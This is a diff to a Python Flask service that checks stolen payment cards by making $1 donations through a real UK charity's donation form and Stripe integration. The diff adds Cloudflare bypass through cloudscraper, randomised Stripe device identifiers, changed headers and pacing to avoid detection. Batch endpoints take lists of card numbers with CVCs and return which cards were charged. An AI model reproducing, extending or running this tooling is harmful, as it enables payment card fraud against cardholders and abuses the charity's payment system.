@@ -3,10 +3,9 @@ import requests
 import json
 import random
 import re
-from bs4 import BeautifulSoup
-from typing import Dict
 import time
-import threading
+from typing import Dict
+import cloudscraper
 
 app = Flask(__name__)
 
@@ -53,37 +52,55 @@ class BravehoundDonationBot:
         self.exp_month = parts[1].strip()
         self.exp_year = parts[2].strip()
         self.cvc = parts[3].strip()
-        self.session = requests.Session()
+        
+        # Create cloudscraper session to bypass Cloudflare
+        self.scraper = cloudscraper.create_scraper(
+            browser={
+                'browser': 'chrome',
+                'platform': 'windows',
+                'mobile': False
+            }
+        )
+        
         self.address = USAddressGenerator.generate_address()
         self.form_hash = None
         self.payment_method_id = None
         
     def get_form_hash(self):
         url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
+        
+        # Rotating headers
+        headers = {
+            'X-Requested-With': "XMLHttpRequest",
+            'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
+            'Origin': "https://www.bravehound.co.uk",
+            'Referer': "https://www.bravehound.co.uk/donation/",
+            'Accept': "application/json, text/javascript, */*; q=0.01",
+            'Accept-Language': "en-US,en;q=0.9",
+            'Accept-Encoding': "gzip, deflate, br",
+            'Connection': "keep-alive",
+            'Sec-Fetch-Dest': "empty",
+            'Sec-Fetch-Mode': "cors",
+            'Sec-Fetch-Site': "same-origin",
+        }
+        
         payload = {
             'action': "give_donation_form_reset_all_nonce",
             'give_form_id': "13302"
         }
-        headers = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-            'sec-ch-ua-platform': '"Android"',
-            'x-requested-with': "XMLHttpRequest",
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
-            'sec-ch-ua-mobile': "?1",
-            'origin': "https://www.bravehound.co.uk",
-            'sec-fetch-site': "same-origin",
-            'sec-fetch-mode': "cors",
-            'sec-fetch-dest': "empty",
-            'referer': "https://www.bravehound.co.uk/donation/",
-            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-            'priority': "u=1, i",
-        }
-        response = self.session.post(url, data=payload, headers=headers)
-        self.form_hash = response.json()['data']['give_form_hash']
-        return self.form_hash
+        
+        response = self.scraper.post(url, data=payload, headers=headers, timeout=30)
+        
+        if response.status_code == 200:
+            data = response.json()
+            self.form_hash = data['data']['give_form_hash']
+            return self.form_hash
+        else:
+            raise Exception(f"Failed to get form hash: Status {response.status_code}")
     
     def create_payment_method(self):
         url = "https://api.stripe.com/v1/payment_methods"
+        
         payload = {
             'type': "card",
             'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
@@ -92,43 +109,42 @@ class BravehoundDonationBot:
             'card[cvc]': self.cvc,
             'card[exp_month]': self.exp_month,
             'card[exp_year]': self.exp_year[-2:],
-            'guid': "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
-            'muid': "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
-            'sid': "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
+            'guid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
+            'muid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
+            'sid': f"{random.randint(10000000, 99999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(100000000, 999999999)}",
             'payment_user_agent': "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
             'referrer': "https://www.bravehound.co.uk",
             'time_on_page': str(random.randint(30000, 50000)),
-            'client_attribution_metadata[client_session_id]': "63059f23-5d3b-4e7b-b77f-7c5d2fc5630d",
-            'client_attribution_metadata[merchant_integration_source]': "elements",
-            'client_attribution_metadata[merchant_integration_subtype]': "split-card-element",
-            'client_attribution_metadata[merchant_integration_version]': "2017",
             'key': "pk_live_SMtnnvlq4TpJelMdklNha8iD",
             '_stripe_account': "acct_1GZhGGEfZQ9gHa50",
         }
+        
         headers = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
             'Accept': "application/json",
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
-            'sec-ch-ua-mobile': "?1",
-            'origin': "https://js.stripe.com",
-            'sec-fetch-site': "same-site",
-            'sec-fetch-mode': "cors",
-            'sec-fetch-dest': "empty",
-            'referer': "https://js.stripe.com/",
-            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-            'priority': "u=1, i"
+            'Content-Type': "application/x-www-form-urlencoded",
+            'Origin': "https://js.stripe.com",
+            'Referer': "https://js.stripe.com/",
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         }
-        response = self.session.post(url, data=payload, headers=headers)
-        self.payment_method_id = response.json()['id']
-        return self.payment_method_id
+        
+        response = self.scraper.post(url, data=payload, headers=headers, timeout=30)
+        data = response.json()
+        
+        if 'id' in data:
+            self.payment_method_id = data['id']
+            return self.payment_method_id
+        else:
+            error_msg = data.get('error', {}).get('message', 'Unknown error')
+            raise Exception(f"Stripe error: {error_msg}")
     
     def submit_donation(self):
         url = "https://www.bravehound.co.uk/donation/"
+        
         params = {
             'payment-mode': "stripe",
             'form-id': "13302"
         }
+        
         payload = {
             'give-honeypot': "",
             'give-form-id-prefix': "13302-1",
@@ -164,56 +180,80 @@ class BravehoundDonationBot:
             'give_action': "purchase",
             'give-gateway': "stripe"
         }
+        
         headers = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
-            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            'cache-control': "max-age=0",
-            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
-            'sec-ch-ua-mobile': "?1",
-            'sec-ch-ua-platform': '"Android"',
-            'origin': "https://www.bravehound.co.uk",
-            'upgrade-insecure-requests': "1",
-            'sec-fetch-site': "same-origin",
-            'sec-fetch-mode': "navigate",
-            'sec-fetch-user': "?1",
-            'sec-fetch-dest': "document",
-            'referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
-            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
-            'priority': "u=0, i",
+            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+            'Content-Type': "application/x-www-form-urlencoded",
+            'Origin': "https://www.bravehound.co.uk",
+            'Referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
+            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            'Upgrade-Insecure-Requests': "1",
         }
-        response = self.session.post(url, params=params, data=payload, headers=headers, allow_redirects=True)
+        
+        response = self.scraper.post(url, params=params, data=payload, headers=headers, timeout=30, allow_redirects=True)
         return self._parse_response(response.text)
     
     def _parse_response(self, response_text):
-        error_match = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', response_text, re.DOTALL)
-        if error_match:
-            return {"status": "error", "message": error_match.group(1).strip()}
-        elif re.search(r'(thank\s?you|successfully|succeeded)', response_text, re.I):
+        # Success messages
+        if any(word in response_text.lower() for word in ['thank you', 'donation confirmed', 'successfully', 'succeeded']):
             return {"status": "success", "message": "Charged $1"}
-        else:
-            if "card_declined" in response_text:
-                return {"status": "error", "message": "Card declined"}
-            return {"status": "unknown", "message": "Unknown Response"}
+        
+        # Error messages
+        if 'card_declined' in response_text.lower():
+            return {"status": "error", "message": "Card declined"}
+        if 'insufficient funds' in response_text.lower():
+            return {"status": "error", "message": "Insufficient funds"}
+        if 'your card was declined' in response_text.lower():
+            return {"status": "error", "message": "Card declined"}
+        
+        # Extract error from HTML
+        error_patterns = [
+            r'<div class="give_error[^"]*">(.*?)</div>',
+            r'<strong>Error</strong>:(.*?)<br',
+            r'<p class="give_error">(.*?)</p>'
+        ]
+        
+        for pattern in error_patterns:
+            match = re.search(pattern, response_text, re.DOTALL | re.IGNORECASE)
+            if match:
+                error_text = re.sub(r'<[^>]+>', '', match.group(1)).strip()
+                return {"status": "error", "message": error_text}
+        
+        return {"status": "error", "message": "Donation failed"}
     
     def run(self):
         try:
+            # Step 1: Get form hash
             self.get_form_hash()
-            time.sleep(random.uniform(0.5, 1.5))
+            time.sleep(random.uniform(1, 2))
+            
+            # Step 2: Create payment method
             self.create_payment_method()
             time.sleep(random.uniform(1, 2))
+            
+            # Step 3: Submit donation
             result = self.submit_donation()
+            
+            # Add card and address info
             result["card"] = self.card_number
             result["address"] = f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
+            
             return result
+            
         except Exception as e:
-            return {"status": "error", "message": str(e), "card": self.card_number}
+            return {
+                "status": "error",
+                "message": str(e),
+                "card": self.card_number,
+                "address": None
+            }
 
 @app.route('/strip', methods=['GET'])
 def strip_check():
     cc = request.args.get('cc')
     
     if not cc:
-        return jsonify({"error": "cc parameter is required", "status": "error"}), 400
+        return jsonify({"error": "cc parameter required", "status": "error"}), 400
     
     parts = cc.split('|')
     if len(parts) != 4:
@@ -222,14 +262,12 @@ def strip_check():
     bot = BravehoundDonationBot(cc)
     result = bot.run()
     
-    response_data = {
+    return jsonify({
         "card": result.get("card"),
         "address": result.get("address"),
         "status": result.get("status"),
         "message": result.get("message")
-    }
-    
-    return jsonify(response_data)
+    })
 
 @app.route('/strip_batch', methods=['POST'])
 def strip_batch():
@@ -241,11 +279,12 @@ def strip_batch():
     cards = data['cards']
     results = []
     
-    for card_data in cards:
+    for idx, card_data in enumerate(cards):
         parts = card_data.split('|')
         if len(parts) != 4:
             results.append({
                 "card": card_data.split('|')[0] if '|' in card_data else card_data,
+                "address": None,
                 "status": "error",
                 "message": "Invalid format"
             })
@@ -259,13 +298,23 @@ def strip_batch():
             "status": result.get("status"),
             "message": result.get("message")
         })
-        time.sleep(random.uniform(1, 3))
+        
+        # Delay between requests
+        if idx < len(cards) - 1:
+            time.sleep(random.uniform(2, 4))
     
     return jsonify({
         "total": len(results),
         "success": sum(1 for r in results if r['status'] == 'success'),
         "error": sum(1 for r in results if r['status'] == 'error'),
         "results": results
+    })
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    return jsonify({
+        "status": "healthy",
+        "message": "Server is running on Railway without proxy"
     })
 
 if __name__ == "__main__":
